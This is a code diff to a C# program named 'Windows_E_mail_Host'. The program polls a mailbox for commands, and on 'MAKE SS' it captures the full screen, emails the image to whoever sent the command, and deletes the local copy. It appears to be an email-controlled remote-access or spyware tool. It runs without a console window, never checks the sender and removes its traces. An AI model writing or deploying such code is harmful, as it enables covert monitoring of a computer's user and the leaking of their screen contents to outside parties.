@@ -28,12 +28,12 @@ namespace Windows_E_mail_Host
         
         static string SSPatch = Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);
 
+        static string replyTo;
 
         static void Main(string[] args)
         {
             System.Threading.Timer checkForNewMail = new System.Threading.Timer(CheckForMail, null, 0, 10000);
-
-            Console.ReadKey();
+            Application.Run();
         }
         
         static void CheckForMail(object o)
@@ -57,7 +57,7 @@ namespace Windows_E_mail_Host
 
                     string[] EmailLines = email.BodyText.Text.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
 
-
+                    replyTo = email.From.Email;
 
                     for (int line = 0; line < EmailLines.Length; line++)
                     {
@@ -91,6 +91,9 @@ namespace Windows_E_mail_Host
                             case "MAKE SS":
                                 string ssname = MakeScreenCapture();
                                 sendEmail("Screen captured", "", new[] { ssname });
+                                GC.Collect();
+                                GC.WaitForPendingFinalizers();
+
                                 File.Delete(ssname);
 
                                 break;
@@ -153,8 +156,8 @@ namespace Windows_E_mail_Host
 
                     var message = new MailMessage();
 
-                    message.To.Add(new MailAddress(""));
-                    message.From = new MailAddress("");
+                    message.To.Add(new MailAddress(replyTo));
+                    message.From = new MailAddress("SystemMailCommander@gmail.com");
 
                     //message.IsBodyHtml = true;
 
@@ -197,7 +200,7 @@ namespace Windows_E_mail_Host
 
         static string MakeScreenCapture()
         {
-            String name = SSPatch + DateTime.Now.ToString("yyyy-MM-dd + HH;mm;ss.fff") + ".jpg";
+            string name = SSPatch + DateTime.Now.ToString("yyyy-MM-dd + HH;mm;ss.fff") + ".jpg";
 
             Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                             Screen.PrimaryScreen.Bounds.Height);
